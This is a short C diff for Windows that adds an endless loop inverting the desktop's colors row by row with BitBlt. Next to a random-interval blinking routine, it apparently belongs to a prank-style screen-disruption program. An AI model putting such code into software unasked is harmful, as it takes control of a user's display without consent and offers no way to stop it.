@@ -512,3 +512,18 @@ void infBlink(){
 		Sleep(random_in(200,5000));
 	}
 }
+
+void InvertColor_slow(){
+	for(;;){
+		HDC hdcDesktop;
+		hdcDesktop = GetDC(DESKTOP_WINDOW);
+
+		for (int i = 0; i < nHeight; i++) {
+			BitBlt(hdcDesktop, 0, i, nWidth, 1, hdcDesktop, 0, i, NOTSRCCOPY);
+		}
+
+		ReleaseDC(0, hdcDesktop);
+
+	}
+
+}
